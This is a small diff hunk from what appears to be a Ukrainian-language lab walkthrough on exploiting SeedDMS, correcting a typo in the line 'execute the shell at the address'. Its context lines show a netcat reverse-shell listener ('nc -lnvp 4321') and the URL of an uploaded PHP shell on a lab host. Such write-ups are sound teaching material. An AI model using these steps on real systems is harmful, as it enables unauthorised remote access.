@@ -187,7 +187,7 @@ nc -lnvp 4321
 ```
 ![alt text](./Images/image22.png)
 
-Виконуємо шелл заадресою
+Виконуємо шелл за адресою
 ```plaintext
 http://192.168.160.252/seeddms51x/data/1048576/8/1.php
 ```
